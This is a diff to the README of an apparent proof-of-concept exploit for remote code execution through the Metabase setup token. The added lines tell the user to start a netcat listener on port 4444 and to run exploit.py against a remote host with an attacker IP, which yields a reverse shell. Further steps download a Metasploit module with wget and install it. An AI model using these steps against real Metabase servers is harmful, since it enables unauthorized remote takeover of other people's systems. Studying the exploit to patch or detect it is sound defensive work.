@@ -12,8 +12,21 @@ product:"Metabase"
 ```
 app="Metabase"
 ```
-  
 ## Install
+```
+pip install requests
+```
+
+## Usage
+```
+nc -nvlp 4444
+```
+
+```
+python3 exploit.py --rhost url_remote_host --lhost attacker_ip --lport 4444
+```
+
+## Install Metasploit
 ```
 wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Metabase/metabase_setup_token_rce.rb
 ```
@@ -21,7 +34,7 @@ wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Metabase/metabase_
 cp metabase_setup_token_rce.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
 ```
 
-## Usage
+## Usage Metasploit
 ```
 msfdb reinit; msfconsole -q
 ```
